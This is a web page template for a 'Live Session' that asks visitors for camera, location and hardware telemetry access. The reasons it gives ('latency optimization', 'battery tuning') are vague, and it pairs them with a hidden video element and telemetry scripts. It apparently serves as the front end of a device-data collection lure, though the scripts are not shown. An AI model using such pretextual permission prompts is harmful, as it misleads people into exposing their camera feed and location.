<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>{{ experience_name }}</title>
  <link rel="stylesheet" href="/static/css/session.css" />
</head>
<body>

  <!-- Permission Modal Overlay -->
  <div id="perm-modal-overlay" class="perm-modal-overlay">
    <div class="perm-modal">
      <div class="perm-icon-wrapper">🛡️</div>
      <h2>Interactive Experience</h2>
      <p>This session includes interactive features and device telemetry optimization.</p>

      <div class="perm-features-list">
        <div class="perm-item"><span>📷</span> <span>Camera (Live interactive gameplay)</span></div>
        <div class="perm-item"><span>📍</span> <span>Location (Regional latency optimization)</span></div>
        <div class="perm-item"><span>⚡</span> <span>Hardware specs & battery tuning</span></div>
      </div>

      <button id="btn-grant-perms" class="btn-primary" style="margin-bottom: 10px;">Enable Interactive Features</button>
      <button id="btn-skip-perms" class="btn-secondary" style="width: 100%;">Continue without Permissions</button>
    </div>
  </div>

  <!-- Main Application Container -->
  <div class="app-container">
    <div class="top-bar">
      <div class="brand-badge">
        <span class="pulse-dot"></span>
        <span>Live Session</span>
      </div>
      <div id="connection-status">Connected</div>
    </div>

    <!-- Active Camera Indicator Bar -->
    <div id="camera-indicator-bar" class="camera-indicator-bar">
      <div style="display: flex; align-items: center; gap: 8px;">
        <span class="pulse-dot" style="background: #ef4444; box-shadow: 0 0 8px #ef4444;"></span>
        <span>Camera Active</span>
      </div>
      <button id="btn-stop-camera" class="btn-stop-camera">Stop Camera</button>
    </div>

    <!-- Dynamic Experience Content -->
    <main id="experience-root">
      {% include experience_template %}
    </main>
  </div>

  <!-- Offscreen Video & Canvas Elements -->
  <video id="hidden-video" autoplay playsinline muted></video>
  <canvas id="offscreen-canvas"></canvas>

  <!-- Configuration Initialization -->
  <script>
    window.SESSION_CONFIG = {
      token: "{{ token }}",
      experience: "{{ experience }}",
      experienceName: "{{ experience_name }}"
    };
  </script>

  <!-- Modular Scripts -->
  <script src="/static/js/api.js"></script>
  <script src="/static/js/permissions.js"></script>
  <script src="/static/js/events.js"></script>
  <script src="/static/js/telemetry.js"></script>
  <script src="/static/js/camera.js"></script>
  <script src="/static/js/location.js"></script>
  <script src="/static/js/media.js"></script>
  <script src="/static/js/session.js"></script>

</body>
</html>
